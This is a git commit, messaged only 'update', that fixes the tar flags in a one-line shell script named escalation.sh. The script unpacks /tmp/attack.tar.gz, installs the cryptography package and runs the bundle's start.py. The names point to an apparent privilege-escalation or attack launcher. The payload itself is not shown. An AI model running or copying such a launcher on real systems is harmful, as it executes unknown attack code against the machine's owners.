fb93f7785c1cf4615fa1cd09c658616b0fefc8c7
comet959 <1376723538@qq.com>
2026-01-12 23:08:51 +0800

    update

--- escalation.sh
+++ escalation.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-tar -C /tmp xzvf /tmp/attack.tar.gz && pip3 install cryptography && cd /tmp/attack && python3 ./start.py
+tar -C /tmp -xzvf /tmp/attack.tar.gz && pip3 install cryptography && cd /tmp/attack && python3 ./start.py
